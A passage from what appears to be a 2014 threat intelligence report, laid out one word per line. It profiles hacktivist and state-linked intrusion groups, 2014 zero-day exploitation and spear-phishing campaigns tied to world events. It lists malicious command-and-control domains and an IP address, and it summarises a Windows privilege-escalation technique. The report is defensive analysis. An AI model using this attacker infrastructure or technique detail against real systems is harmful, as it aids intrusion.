group
.

In
addition
,
the
group
also
admitted
to
renting
botnets
and
running
booters
,
confirming
that
their
skill
level
is
relatively
low
.

Despite
this
,
the
threat
they
posed
to
gaming
companies
was
still
noteworthy
,
especially
when
combined
with
terrorist
threats
;
although
they
were
bluster
,
they
still
had
considerable
real
-
world
consequences
.

DEADEYE
JACKAL
:
Far
From
Dead
Although
DEADEYE
JACKAL
does
n't
have
the
kind
of
coverage
it
once
had
in
the
media
around
its
high-
profile
hacks
,
the
group
is
still
active
.

It
still
conducts
the
occasional
mass
defacements
and
is
focusing
on
improving
and
strengthening
its
dissemination
pathways
,
including
migrating
to
more
private
social
media
and
adding
a
mobile
site
and
Android
app
.

DEADEYE
JACKAL
even
developed
and
released
its
own
Linux
-
based
operating
system
,
called
SEANux
,
at
the
end
of
October
2014
.

DEADEYE
JACKAL
continues
its
international
censorship
of
online
articles
that
it
deems
detrimental
to
Syria
or
to
Syrian
President
Bashar
Assad
.

On
Thanksgiving
,
the
group
defaced
just
over
60
websites
,
including
media
websites.1
The
websites
were
primarily
from
the
United
States
and
the
United
Kingdom
but
also
included
Japan
,
Canada
,
the
Philippines
,
New
Zealand
,
Mexico
,
and
South
Africa
.

A
message
on
DEADEYE
JACKAL
's
Twitter
account
showed
possible
motivations
outside
of
opportunistic
targeting
,
saying
"
The
press
:
Please
do
n't
pretend
#
ISIS
are
civilians
"
.

The
most
recent
cyber
attack
by
DEADEYE
JACKAL
was
on
18
December
2014
,
when
the
group
hacked
the
website
of
the
International
Business
Times
to
remove
an
article
due
to
its
coverage
of
Syria
,
which
DEADEYE
1
"
Syrian
Electronic
Army
hacks
several
websites
,
Forbes
,
Ferrari
,
Independent
,
Daily
Telegraph
and
many
other
websites
hijacked
"
,
27
November
2014
,
http://www.techworm
.

net/2014/11/syrian
-
electronic
-
army
-
hacks
-
sev-
eral
-
websites
-
forbes
-
ferrari
-
independent
-
dai-
ly-telegraph-many-websites-hijacked.html
2
"
Syrian
Electronic
Army
hacks
International
Business
Times
(
IBT
)
for
alleged
false
coverage
of
Syria
"
,
18
December
2014
,
http://www
.

techworm.net/2014/12/syrian
-
electronic
-
ar-
my-hacks-international-business-times.html
3
See
"
The
Syrian
Army
is
Shrinking
,
and
Assad
is
Running
Out
of
Soldiers
"
,
17
December
2014
,
http://www.ibtimes.com/
syrian
-
army
-
shrinking
-
assad-
running
-
out
-
soldiers-1761914
Notable
Activity
JACKAL
perceived
as
false.2
The
deleted
article
discussed
depleting
military
resources
of
President
Assad
,
in
terms
of
soldiers
,
since
the
start
of
the
U.S.

campaign
in
Syria
against
the
Islamic
State
.

The
article
,
however
,
was
soon
reposted
by
the
International
Business
Times
and
remains
available.3
DEADEYE
JACKAL
used
to
be
limited
to
operating
through
its
website
,
Twitter
account
,
and
Facebook
account
,
which
proved
problematic
in
some
ways
since
their
communications
could
be
terminated
more
easily
when
Twitter
or
Facebook
decided
to
shut
down
their
accounts
.

It
became
a
joke
to
DEADEYE
JACKAL
how
many
Facebook
pages
it
could
start
up
that
would
be
shut
down
.

However
,
DEADEYE
JACKAL
did
realize
that
more
stable
and
varied
dissemination
pathways
for
their
messaging
were
needed
.

Additionally
,
the
group
decided
it
also
needed
communications
that
would
have
less
chance
of
being
monitored
by
its
enemies
.

In
September
2013
,
DEADEYE
JACKAL
changed
its
email
provider
from
Gmail
to
Mail.ru
.

The
change
was
likely
a
result
of
suspicions
that
their
emails
were
being
monitored
in
light
of
the
leaks
made
by
Edward
Snowden
earlier
in
2013
.

In
other
moves
to
protect
privacy
,
DEADEYE
JACKAL
opened
up
accounts
with
VK
,
formerly
VKontakte4
(
the
Russia
-
based
social
media
website
similar
to
Facebook
owned
by
Mail.ru
Group
and
Ello5
)
,
a
new
social
media
website
that
boasts
that
it
does
not
sell
ads
or
its
users
'
data
to
advertisers
.

It
also
does
not
allow
any
data
mining
against
the
users
of
its
site
.

DEADEYE
JACKAL
also
launched
a
mobile
site
for
its
website
and
an
Android
app
.

These
are
all
in
addition
to
the
group
's
already
-
established
accounts
on
Pinterest6
,
Instagram7
,
YouTube8
,
and
Twitter9
.

Most
notably
,
the
group
developed
and
released
its
own
operating
system
,
called
SEANux
.

SEANux
offers
little
overall
improvement
over
other
Linux-
based
systems
like
Kali
or
BackTrack
.

SEANux
automatically
loads
a
desktop
system
monitor
that
makes
several
network
requests
,
creating
a
sidebar
.

The
sidebar
provides
the
user
information
about
the
system
,
running
processes
,
weather
(
Damascus
,
DI
,
Syria
)
,
currency
rates
,
and
some
other
high
-
level
information
.

Also
on
this
side
bar
is
a
small
window
with
a
feed
of
news
from
DEADEYE
JACKAL
's
website10
.

Notable
Activity
The
most
notable
aspect
of
SEANux
is
the
tools
it
offers
.

SEANux
offers
some
standard
offensive
/
pentesting
tools
,
including
Metasploit
Framework
,
SQLMap
,
nMap
,
Aircrack
,
and
John
the
Ripper
.

There
is
also
an
included
directory
with
other
miscellaneous
PHP
and
Perl
scripts
,
however
most
of
these
do
not
appear
to
be
created
by
DEADEYE
JACKAL
.

SEANux
also
offers
a
custom
set
of
offensive
/
pentesting
tools
including
.

DEADEYE
JACKAL
has
not
attempted
the
ruse
that
Anonymous
did
in
2012
when
they
released
Anonymous
-
OS
,
which
was
found
to
be
riddled
with
Trojans
.

SEANux
does
connect
to
some
DEADEYE
JACKAL
-
controlled
Notable
Activity
resources
such
as
their
RSS
feed
,
images
in
the
webshells
,
and
a
Firefox
custom
SEANux
homepage
.

It
is
possible
for
DEADEYE
JACKAL
to
monitor
to
see
who
is
connecting
to
these
resources
,
but
outside
of
that
,
the
operating
system
functions
normally
.

FRATERNAL
JACKAL
In
2012
and
2013
,
a
four
-
phased
attack
known
as
Operation
Ababil
,
or
OpAbabil
,
was
conducted
by
a
group
of
Iranian
actors
targeting
U.S.

financial
institutions
with
DDoS
attacks
.

This
adversary
,
which
CrowdStrike
tracks
under
the
name
FRATERNAL
JACKAL
,
has
been
suspected
of
having
ties
to
the
Iranian
government
.

It
has
been
known
to
increase
attack
volume
during
periods
of
economic
tension
between
Iran
and
western
countries
.

Despite
suspicion
of
political
motivations
,
the
group
has
publicly
attested
in
several
Pastebin.com
posts
that
the
motivation
for
these
attacks
are
negative
depictions
of
the
Muslim
Prophet
Muhammad
in
several
YouTube
videos
.

Attacks
from
this
adversary
group
have
been
primarily
conducted
using
a
botnet
of
public
-
facing
web
servers
that
have
been
exploited
through
vulnerable
Content
Management
Systems
(
CMS
)
.

Unlike
traditional
botnets
in
which
infected
hosts
connect
to
control
servers
for
tasking
,
within
FRATERNAL
JACKAL
's
botnet
,
nodes
are
directly
tasked
by
the
adversary
through
multiple
layers
of
infrastructure
.

CrowdStrike
Intelligence
continued
to
actively
investigate
this
adversary
during
2014
,
specifically
seeking
means
by
which
it
propagated
its
botnet
.

In
October
,
a
PHP
script
was
identified
in
connection
with
this
adversary
.

This
script
is
used
for
scanning
lists
of
domains
by
parsing
each
domain
's
robots.txt
file
to
identify
any
server
running
the
CMS
Joomla
.

Domains
identified
from
this
script
are
directly
posted
to
a
hard
-
coded
control
server
,
something
not
seen
previously
by
CrowdStrike
with
this
adversary
's
toolkit
.

Normally
,
performing
server
reconnaissance
by
parsing
the
robots.txt
file
of
a
server
is
a
trivial
task
.

However
,
when
looked
at
in
the
context
of
this
adversary
's
strategic
operations
,
it
suggests
that
the
adversary
is
not
only
Notable
Activity
using
their
first
-
stage
infrastructure
for
offensive
actions
against
targets
,
but
also
for
further
expansion
of
their
botnet
.

Despite
FRATERNAL
JACKAL
no
longer
publicly
posting
motivations
and
notices
of
upcoming
attacks
to
Pastebin
,
their
botnet
remains
online
and
capable
of
performing
attacks
.

It
is
likely
that
in
the
event
of
future
tensions
between
Iran
and
western
countries
,
this
group
may
publicly
resurface
and
continue
their
attack
campaigns
.

2014
Zero
-
Day
Activity
The
occurrence
of
a
zero
-
day
,
or
a
previously
unknown
vulnerability
being
exploited
in
the
wild
,
is
generally
an
unusual
occurrence
.

These
events
almost
always
tell
an
interesting
story
when
they
are
initially
discovered
.

During
the
course
of
2014
,
there
were
hundreds
of
newly
identified
vulnerabilities
that
were
categorized
by
Mitre
under
the
Common
Vulnerabilities
and
Exposures
(
CVE
)
system
.

Many
of
these
were
identified
by
researchers
or
vendors
through
auditing
and
other
proactive
security
reviews
.

In
some
cases
,
the
vulnerabilities
were
first
identified
being
used
by
adversaries
(
the
development
and
proliferation
of
those
vulnerabilities
are
a
fascinating
component
of
the
threat
landscape
)
.

There
were
several
such
events
that
occurred
this
year
;
three
are
particularly
interesting
from
an
adversary
perspective
,
namely
CVE-2014
-
0322
,
CVE-2014
-
4113
,
and
CVE-
2014
-
1761
.

There
were
numerous
interesting
exploits
identified
this
year
,
many
used
by
various
adversaries
such
as
the
SSL
Heartbleed
attack
(
CVE-
2014
-
0160
)
and
the
ShellShock
Bourne
Again
Shell
(
BASH
)
vulnerabilities
(
CVE-2014
-
6271
,
CVE-2014
-
6277
,
CVE-2014
-
6278
,
CVE-2014
-
7169
,
CVE-
2014
-
7186
,
and
CVE-2014
-
7187
)
.

These
exploits
were
not
necessarily
exemplary
of
the
related
adversary
narrative
that
helps
to
determine
the
"
who
"
behind
the
attacks
that
CrowdStrike
focuses
on
from
an
intelligence
standpoint
.

CVE-2014
-
0322
-
Internet
Explorer
Arbitrary
Code
Execution
This
zero
-
day
vulnerability
in
Microsoft
Internet
Explorer
allowed
code
execution
via
specially
crafted
JavaScript
code
,
making
it
ideal
for
Strategic
Notable
Activity
Web
Compromise
(
SWC
)
or
drive
-
by
operations
.

There
were
two
primary
campaigns
associated
with
CVE-2014
-
0322
.

The
first
to
be
publicly
identified
occurred
in
February
2014
and
was
hosted
on
the
website
of
the
Veterans
of
Foreign
Wars
(
VFW
)
.

This
incident
delivered
a
fairly
common
,
publicly
available
RAT
called
ZxShell
,
which
connected
to
a
C2
at
newss.effers.com
.

This
is
a
domain
that
CrowdStrike
associates
with
the
AURORA
PANDA
adversary
.

Investigation
into
the
VFW
incident
led
to
the
discovery
of
other
sites
(
savmpet.com
,
gifas.assso.net
,
and
icbcqsz.com
)
also
hosting
this
exploit
code
.

These
sites
not
only
shared
the
same
IP
address
as
each
other
,
but
also
contained
the
same
content
that
was
taken
from
the
website
for
the
French
aerospace
industries
association
,
Groupement
des
Industries
Fran
aises
A
ronautiques
et
Spatiales
(
GIFAS
)
.

The
dates
visible
on
these
webpages
and
those
dates
found
in
the
pages
'
source
code
indicated
that
they
were
created
on
17
January
2014
,
which
predated
the
VFW
incident
by
nearly
a
month
.

However
,
this
operation
utilized
drive
-
by
tactics
rather
than
SWC
because
the
sites
hosting
the
code
were
controlled
by
the
adversary
and
not
compromised
legitimate
sites
.

The
GIFAS
-
related
activity
delivered
a
different
malware
payload
(
Sakula
)
than
the
VFW
incident
(
ZxShell
)
.

The
Sakula
payload
communicated
with
an
entirely
different
C2
infrastructure
than
the
ZxShell
,
oa.ameteksen.com
.

This
indicates
that
a
different
adversary
was
responsible
for
the
GIFAS-
related
SWC
operation
.

Further
investigation
into
this
activity
showed
a
number
of
similarities
to
a
2012
zero
-
day
(
CVE-2012
-
4792
)
SWC
campaign
that
leveraged
the
website
of
a
U.S
.-
based
manufacturer
,
Capstone
Turbine
.

These
similarities
were
:
the
use
of
Sakula
malware
,
GIFAS
-
based
subdomains
related
to
both
incidents
,
and
the
use
of
zero
-
day
vulnerabilities
.

At
the
end
of
2014
,
CrowdStrike
Intelligence
also
discovered
potential
links
between
this
adversary
and
its
HURRICANE
PANDA
adversary
(
discussed
in
more
detail
below
)
;
however
,
evaluation
of
these
connections
is
still
ongoing
.

CVE-2014
-
4113
–
Local
Privilege
Escalation
Every
now
and
then
,
an
adversary
reveals
their
trump
card
when
they
Notable
Activity
become
desperate
for
access
to
a
victim
's
infrastructure
.

This
occurred
in
October
2014
when
the
Chinese
adversary
tracked
by
CrowdStrike
as
HURRICANE
PANDA
deployed
a
tool
called
Win64.exe
on
a
compromised
system
that
was
used
to
invoke
other
programs
with
elevated
privileges
.

Analysis
of
the
Win64.exe
binary
revealed
that
it
exploits
a
previously
unknown
vulnerability
to
elevate
its
privileges
to
those
of
the
SYSTEM
user
and
then
create
a
new
process
with
these
access
rights
to
run
the
command
that
was
passed
as
an
argument
.

The
file
itself
is
only
55
kilobytes
in
size
and
contains
just
a
few
functions
.

First
,
the
exploit
gained
kernel
execution
by
corrupting
memory
in
the
Windows
window
manager
and
used
this
increased
level
of
authority
to
overwrite
an
access
token
in
the
EPROCESS
structure
of
the
user
-
mode
process
with
that
of
the
SYSTEM
process
.

From
this
elevation
,
any
command
passed
to
the
executable
was
executed
with
elevated
privileges
.

The
vulnerability
was
present
in
both
32-bit
and
64-bit
architectures
of
Windows
from
Windows
XP
to
Windows
7
.

The
code
to
perform
these
steps
is
extremely
well
written
and
fully
reliable
.

The
adversary
has
gone
through
considerable
effort
to
minimize
the
chance
of
its
discovery
.

The
exploit
tool
was
only
deployed
when
absolutely
necessary
during
the
intrusion
operations
,
and
it
was
deleted
immediately
after
use
.

A
build
timestamp
of
the
Win64.exe
binary
of
3
May
2014
suggests
that
the
vulnerability
was
actively
exploited
in
the
wild
for
at
least
five
months
prior
to
discovery
.

What
is
more
,
after
being
able
to
characterize
the
exploit
,
earlier
versions
were
found
that
indicate
constant
development
of
privilege
-
escalation
tools
.

In
fact
,
some
tools
were
found
with
exploits
for
similar
vulnerabilities
that
have
been
addressed
by
Microsoft
in
patches
released
earlier
in
2014
.

These
tools
share
an
overall
structure
with
the
new
one
,
indicating
that
the
same
code
was
used
to
weaponize
privilege-
escalation
exploits
for
different
security
bugs
.

These
observations
suggest
that
HURRICANE
PANDA
maintains
an
arsenal
of
exploits
for
unpatched
privilege
-
escalation
vulnerabilities
.

two
thousand
fourteen
CrowdStrike
Global
Threat
Intel
Report
Notable
Activity
This
case
underlines
the
necessity
of
tight
endpoint
monitoring
in
order
to
detect
adversary
behavior
like
this
.

Within
days
of
discovering
the
use
of
the
exploit
,
CrowdStrike
reported
the
vulnerability
and
a
proof
of
concept
to
Microsoft
,
which
subsequently
released
security
bulletin
MS14
-
058
,
as
well
as
patches
for
all
affected
platforms
.

CVE-2014
-
1761
-
Microsoft
Word
Remote
Code
Execution
In
2014
,
CrowdStrike
Intelligence
spent
a
significant
amount
of
time
investigating
operations
that
leveraged
the
new
Microsoft
Word
exploit
,
CVE-2014
-
1761
.

The
exploit
for
this
vulnerability
was
a
bit
complex
,
but
if
successful
it
allowed
for
remote
code
execution
.

Cybercrime
adversaries
were
the
first
to
use
the
exploit
in
the
wild
;
however
,
its
use
soon
proliferated
to
Russia-
and
China
-
based
targeted
intrusion
adversaries
.

The
proliferation
of
an
exploit
such
as
CVE-2014
-
1761
across
several
adversaries
is
not
unprecedented
,
but
it
does
illustrate
the
possible
ways
in
which
actors
are
connected
.

In
this
instance
,
cybercrime
actors
were
the
first
observed
using
the
exploit
in
the
wild
.

Several
weeks
later
targeted
intrusion
adversaries
began
leveraging
it
in
their
operations
.

The
most
likely
explanation
for
this
is
that
targeted
intrusion
adversaries
were
able
to
rediscover
and
develop
the
exploit
code
once
a
vendor
advisory
was
released
.

Notable
Activity
This
seems
to
be
the
most
likely
because
Microsoft
released
its
initial
advisory
on
the
exploit
in
late
March
,
and
targeted
activity
began
in
early
April
.

However
,
another
possible
proliferation
pathway
for
the
exploit
is
a
direct
pass
from
a
cybercrime
actor
to
a
targeted
intrusion
actor
.

It
is
also
possible
that
individuals
involved
in
cybercrime
operations
are
also
carrying
out
targeted
intrusion
operations
and
were
able
to
use
the
exploit
for
both
purposes
.

CrowdStrike
Intelligence
also
discovered
a
simple
builder
program
,
which
allowed
malicious
actors
to
automatically
build
CVE-2014
-
1761
exploit
documents
.

This
allows
for
a
decoy
document
and
malicious
executable
to
be
combined
with
a
malicious
CVE-2014
-
1761
document
.

The
Chinese
characters
show
that
it
was
meant
for
use
by
Chinese
adversaries
,
and
could
explain
how
it
so
easily
proliferated
among
China
-
based
adversaries
.

PITTY
PANDA
is
one
actor
who
actively
developed
the
capability
to
use
this
exploit
.

This
actor
is
interesting
in
that
they
exhibit
a
remarkably
disparate
level
of
sophistication
.

On
the
one
hand
,
the
actor
has
proven
to
be
one
of
the
early
groups
that
are
able
to
successfully
weaponize
documents
with
an
exploit
for
CVE-2014
-
1761
,
showing
a
notable
level
of
competence
in
this
specific
matter
.

On
the
other
hand
,
this
adversary
exhibits
lack
of
two
thousand
fourteen
CrowdStrike
Global
Threat
Intel
Report
Notable
Activity
consistence
or
expertise
in
certain
other
areas
.

For
example
,
the
re
-
use
of
C2
domains
ending
in
.tw
certainly
sticks
out
in
target
environments
unrelated
to
Taiwan
.

This
was
observed
in
attacks
against
western
aerospace
and
defense
companies
during
2014
.

Recent
CrowdStrike
analysis
on
PITTY
PANDA
has
revealed
that
this
actor
has
been
operating
for
a
longer
time
frame
than
previously
assumed
.

The
activity
likely
goes
back
as
far
as
June
2005
,
resulting
in
a
total
operational
window
of
more
than
nine
years
.

PITTY
PANDA
has
used
at
least
three
different
RAT
families
,
some
of
which
have
undergone
continuous
development
.

PITTY
PANDA
has
recently
shifted
their
target
profile
toward
the
aerospace
and
defense
sectors
,
introducing
a
new
aspect
this
actor
's
operations
.

The
overall
goal
of
much
of
PITTY
PANDA
's
past
activity
appeared
to
be
intelligence
-
gathering
operations
of
a
political
nature
,
but
more
recent
operation
point
more
toward
the
theft
of
intellectual
property
.

The
development
and
adaptation
of
client
-
side
exploits
such
as
CVE-2014
-
1761
may
indicate
that
this
actor
is
seeking
to
further
expand
operations
by
investing
in
technical
capabilities
to
pursue
harder
targets
than
they
have
previously
attacked
.

Event
-
Driven
Operations
Malaysia
Airlines
Incidents
Malaysia
Airlines
suffered
two
catastrophic
incidents
in
2014
.

In
March
,
one
of
its
flights
(
MH370
)
from
Kuala
Lumpur
to
Beijing
mysteriously
disappeared
less
than
an
hour
after
takeoff
.

In
July
,
another
of
its
flights
(
MH17
)
from
Amsterdam
to
Kuala
Lumpur
was
shot
down
while
flying
over
a
conflict
zone
in
Ukraine
.

These
events
received
large
amounts
of
attention
in
the
press
,
and
the
controversy
and
mystery
surrounding
them
made
the
incidents
ideal
for
targeted
intrusion
adversaries
to
use
in
their
operations
.

Operations
leveraging
the
MH370
incident
in
spear
phish
email
began
within
days
of
the
accident
.

The
TEMPER
PANDA
adversary
was
particularly
prolific
in
its
use
of
MH370-related
emails
to
deliver
malicious
documents
that
Notable
Activity
dropped
malware
connecting
to
a
known
TEMPER
PANDA
C2
address
,
www
.
verizon.proxydns.com
.

Activity
from
the
LOTUS
PANDA
adversary
and
an
actor
using
Naikon
malware
was
also
observed
.

Additionally
,
CrowdStrike
identified
an
incident
carried
out
by
an
adversary
believed
to
have
a
nexus
to
Pakistan
.

This
attack
used
a
malicious
zip
archive
containing
a
file
named
Malaysia
Airline
MH370
hijacked
by
Pakistan.scr
.

It
delivered
malware
more
commonly
known
as
BitterBug
,
which
used
a
C2
at
IP
address
199.91.173.45
.

Operations
related
to
the
MH17
crash
appeared
to
be
more
limited
,
but
also
began
within
days
of
the
incident
.

A
number
of
incidents
from
China
-
based
adversaries
were
observed
like
the
one
identified
on
22
July
2014
leveraging
a
decoy
document
concerning
the
black
boxes
on
MH17
and
NetTraveler
malware
connecting
to
a
C2
at
www.gobackto.net
.

The
Russia
-
based
adversary
known
to
CrowdStrike
as
FANCY
BEAR
also
piggybacked
on
the
MH17
disaster
,
targeting
victims
with
the
Sofacy
malware
dropped
alongside
a
document
concerning
the
cessation
of
hostilities
around
the
crash
site
.

Conflict
in
Ukraine
The
conflict
in
Ukraine
has
been
the
motivation
for
a
significant
amount
of
targeted
intrusion
operations
and
other
malicious
cyber
activity
.

The
conflict
was
leveraged
to
conduct
operations
targeting
entities
in
Ukraine
,
Russia
,
and
other
countries
with
interests
in
the
region
.

China
-
based
adversaries
were
active
in
targeting
around
this
conflict
.

A
significant
amount
of
the
activity
from
Chinese
actors
was
related
to
the
MH17
disaster
discussed
above
.

While
other
malicious
operations
related
to
these
events
targeted
Ukrainian
entities
,
most
of
the
activity
from
China-
based
actors
appeared
to
be
targeted
at
Russian
organizations
.

Numerous
incidents
were
identified
leveraging
Russian
-
language
lures
with
content
concerning
security
in
Ukraine
,
such
as
the
one
below
that
was
observed
in
an
incident
from
September
using
PlugX
malware
calling
to
chromeupdate
.

authorizeddns.org
and
googlesupport.proxydns.com
.

Notable
Activity
One
of
the
primary
reasons
for
this
increase
in
Russian
targeting
by
China-
based
adversaries
is
likely
that
ties
between
China
and
Russia
have
recently
been
growing
stronger
.

In
May
2014
,
the
two
countries
agreed
on
a
$
400
billion
deal
for
Russia
to
supply
natural
gas
to
China
.

Additionally
,
they
reached
agreements
over
the
construction
of
a
bridge
between
the
countries
and
the
use
of
a
port
in
eastern
Russia
;
they
also
revealed
a
plan
to
set
up
GPS
ground
stations
in
each
other
's
country
.

This
interaction
between
the
two
countries
increasingly
makes
Russia
a
target
of
interest
for
Chinese
targeted
intrusion
operations
.

In
addition
to
the
China
-
based
activity
,
CrowdStrike
Intelligence
also
identified
an
interesting
set
of
targeted
activity
apparently
focused
on
targets
within
Russia
.

The
actor
responsible
employs
a
rather
complex
piece
of
malware
that
uses
polymorphic
DLLs
and
filenames
customized
on
a
per
-
deployment
basis
.

The
malware
was
dropped
alongside
a
wide
variety
of
malicious
documents
containing
exploit
code
for
either
CVE-2012
-
0158
or
CVE-2014
-
1761
.

Related
decoy
documents
were
both
Russian
and
English
language
and
contained
content
pertaining
to
Russia
such
as
the
Ukrainian
conflict
,
an
advertisement
for
the
sale
of
a
car
from
the
German
embassy
in
Moscow
,
and
an
invitation
to
a
Russian
university
conference
on
space
technology
.

The
actor
abuses
legitimate
cloud
infrastructure
for
its
C2
.

Notable
Activity
High
Volume
of
Southeast
Asia
Targeting
Governments
in
Southeast
Asia
and
organizations
doing
business
in
the
region
have
been
popular
targets
for
China
-
based
targeted
intrusion
operations
for
years
.

China
is
generally
interested
in
Southeast
Asia
because
of
its
proximity
and
its
desire
to
monitor
activity
in
the
region
in
order
to
retain
a
strategic
advantage
.

However
,
during
2014
,
China
was
more
specifically
motivated
to
carry
out
targeted
intrusion
operations
in
the
region
by
tensions
between
it
and
other
Southeast
Asian
nations
,
primarily
Vietnam
and
the
Philippines
,
due
to
disputes
over
territorial
rights
in
the
South
China
Sea
.

The
South
China
Sea
has
long
been
a
source
of
tension
between
China
and
other
Southeast
Asian
nations
.

The
United
Nations
(
UN
)
attempted
to
ease
these
tensions
in
its
1982
Convention
on
the
Law
of
the
Sea
,
which
granted
countries
in
the
region
rights
to
marine
and
energy
resources
within
a
certain
range
of
their
coast
.

This
was
meant
to
give
all
countries
in
the
region
some
claim
to
vital
trade
routes
and
to
the
vast
energy
resources
believed
to
exist
there
.

China
disputes
the
UN
-
granted
rights
and
stakes
a
historical
claim
to
almost
the
entire
South
China
Sea
.

Tensions
really
boiled
over
in
May
2014
when
a
Chinese
state
-
owned
energy
company
placed
an
oil
rig
,
HD-981
,
in
Vietnamese
territorial
waters
.

The
rig
was
deployed
close
to
the
Paracel
Islands
,
which
are
claimed
by
both
China
and
Vietnam
.

The
presence
of
the
rig
precipitated
continuous
clashes
between
Chinese
and
Vietnamese
vessels
,
violent
protests
of
Chinese
businesses
in
Vietnam
,
and
elevated
tensions
between
China
and
other
nations
in
the
region
such
as
the
Philippines
.

It
was
during
this
time
in
May
2014
when
China
-
based
targeted
intrusion
activity
against
entities
in
Southeast
Asia
increased
significantly
.

The
uptick
was
likely
due
to
Chinese
interest
in
monitoring
reaction
of
government
and
other
organizations
in
the
region
.

Numerous
adversaries
(
primarily
GOBLIN
PANDA
,
VIXEN
PANDA
,
LOTUS
PANDA
,
PREDATOR
PANDA
,
and
PIRATE
PANDA
)
and
numerous
malware
variants
(
PlugX
,
Poison
Ivy
,
Mirage
,
Enfal
,
and
Naikon
)
were
observed
being
used
in
these
operations
.

Notable
Activity
Observed
targeting
by
country
-
may
2014
Observed
targeting
by
country
-
june
2014
CrowdStrike
Intelligence
observed
that
GOBLIN
PANDA
and
VIXEN
PANDA
were
the
adversaries
most
actively
targeting
Southeast
Asia
.

GOBLIN
PANDA
activity
was
heavily
weighted
towards
Vietnamese
targets
.

This
adversary
used
multiple
malware
variants
during
this
period
,
but
over
time
switched
over
almost
entirely
to
PlugX
malware
.

Based
on
the
decoy
documents
used
in
the
incidents
,
it
appears
that
Vietnamese
government
organizations
were
a
primary
target
(
although
private
sector
targeting
of
foreign
companies
was
observed
as
well
)
,
as
the
Notable
Activity
decoys
were
often
Vietnamese
government
documents
.

The
screenshot
below
is
an
example
of
one
of
these
decoys
,
with
this
one
related
to
Vietnam
's
Fisheries
Protection
Department
.

A
reference
to
the
HD-981
oil
rig
can
be
seen
in
the
first
sentence
.

The
C2
domain
for
the
malware
used
in
conjunction
with
this
document
was
dns.dubkill.com
.

In
the
regional
targeting
surrounding
these
events
,
VIXEN
PANDA
activity
was
observed
focusing
mostly
on
the
Philippines
,
particularly
in
the
area
of
defense
.

Pictured
below
is
a
decoy
document
from
an
incident
identified
in
April
.

The
only
content
is
a
header
marked
"
Secret
"
with
the
letterhead
for
the
Philippines
Naval
Operation
Center
.

The
malware
used
in
this
incident
was
Mirage
,
installed
using
DLL
side
-
loading
,
which
takes
advantage
of
the
search
order
the
operating
system
goes
through
to
load
DLLs
.

This
particular
sample
Notable
Activity
used
NVIDIA
-
related
files
often
seen
with
PlugX
to
side
-
load
the
Mirage
payload
.

The
C2
for
the
malware
in
this
incident
was
todaynews.dns-dns.com
.

The
Southeast
Asia
activity
declined
dramatically
at
the
end
of
August
,
which
coincided
with
the
time
that
China
removed
HD-981
from
Vietnamese
waters
.

A
slight
spike
occurred
in
October
when
PIRATE
PANDA
and
VIXEN
PANDA
stepped
up
targeting
of
Vietnam
and
the
Philippines
again
,
possibly
due
to
arms
acquisitions
by
Vietnam
meant
to
bolster
its
maritime
security
capabilities
.

Since
that
time
,
sporadic
activity
with
a
Southeast
Asia
focus
was
observed
,
but
nothing
at
a
sustained
level
like
that
which
was
observed
from
May
to
October
.

It
is
highly
likely
that
tensions
will
increase
again
as
the
disputes
over
territory
and
resources
in
the
South
China
Sea
remain
unresolved
.

DEEP
PANDA
Think
Tank
Targeting
In
July
2014
,
CrowdStrike
publicly
reported
on
malicious
activity
linked
to
the
DEEP
PANDA
adversary
at
two
U.S.-
based
think
tanks.11
This
activity
followed
typical
DEEP
PANDA
Tactics
,
Techniques
,
and
Procedures
(
TTPs
)
with
Notable
Activity
what
,
at
the
time
,
was
a
novel
technique
utilizing
PowerShell
to
download
MadHatter
malware
on
victim
machines
.

Although
the
TTPs
were
typical
,
the
specific
targeting
at
each
institution
provided
insight
into
how
these
adversaries
may
be
tasked
in
their
operations
.

Analysis
of
each
incident
revealed
that
,
up
until
mid
-
June
2014
,
the
adversary
was
focused
on
experts
on
Asian
and
Chinese
policy
at
each
affected
institution
.

This
targeting
is
consistent
with
the
objectives
likely
imposed
on
Chinese
intelligence
collection
during
this
time
in
support
of
global
intelligence
collection
surrounding
the
ongoing
HD-981
incident
.

During
mid
-
June
,
DEEP
PANDA
clearly
and
immediately
shifted
focus
from
Asia
-
related
issues
to
Middle
East
-
related
issues
.

This
shift
coincided
with
a
significant
uptick
in
attacks
from
the
Islamic
State
of
Iraq
and
Syria
(
ISIS
)
,
particularly
an
attack
on
the
Baiji
oil
refinery
in
Iraq
.

At
one
institution
,
the
actor
focused
on
a
target
with
expertise
in
China
's
natural
resource
consumption
and
energy
sourcing
requirements
.

Additional
targets
at
this
institution
included
an
executive
assistant
and
network
engineers
and
administrators
.

The
targeting
of
an
executive
assistant
would
likely
provide
access
to
information
on
high
-
level
strategy
and
operational
information
,
and
targeting
of
network
administrators
would
provide
information
useful
in
lateral
movement
and
establishing
persistence
.

At
the
second
institution
,
targeted
individuals
had
extensive
careers
in
the
U.S.

government
and
intelligence
community
,
had
written
on
U.S.

Middle
East
policy
,
and
had
given
congressional
testimony
on
ISIS
issues
.

The
targets
in
this
instance
could
provide
information
on
potential
U.S.

strategy
and
possibly
even
communications
between
the
institution
and
U.S.

government
entities
.

The
rapid
pivot
between
individuals
at
these
institutions
focused
on
Asia
issues
to
individuals
focused
on
Middle
East
issues
shows
how
quickly
these
adversaries
are
able
to
react
to
new
tasking
.

The
targeting
in
these
cases
appear
to
be
in
line
with
interests
of
government
organizations
who
would
desire
information
on
strategic
options
that
the
U.S.

might
be
considering
with
respect
to
ISIS
.

Information
from
these
kinds
of
institutions
would
also
be
useful
to
companies
doing
business
in
the
Middle
East
.

Notable
Activity
World
Cup
The
biggest
event
of
the
year
in
terms
of
media
coverage
and
sheer
global
attention
was
the
FIFA
World
Cup
played
in
Brazil
between
12
June
and
13
July
.

Events
of
this
scale
usually
attract
malicious
actors
who
leverage
them
for
purposes
of
deceiving
targets
into
credentials
theft
,
compromise
of
networks
for
espionage
,
and
other
objectives
.

CrowdStrike
covered
the
run
-
up
to
the
World
Cup
with
reporting
that
outlined
potential
threats
to
the
event
.

Chief
among
these
was
that
of
hacktivists
attacking
or
defacing
websites
related
to
the
Cup
.

Designated
adversary
GHOST
JACKAL
was
detected
partaking
in
said
actions
prior
to
the
beginning
of
the
tournament
,
which
also
saw
large
-
scale
street
protests
against
the
government
.

Later
,
during
the
Cup
,
CrowdStrike
's
warning
came
to
fruition
when
the
websites
for
the
Cup
itself
and
for
Brazil
's
Federal
Police
were
both
taken
down.12
Additionally
,
CrowdStrike
observed
some
limited
World
Cup
-
related
targeted
intrusion
activity
from
China
-
based
actors
LOTUS
PANDA
and
.

VIXEN
PANDA
,
but
the
level
of
activity
from
such
actors
was
not
as
high
as
anticipated
.

Know
your
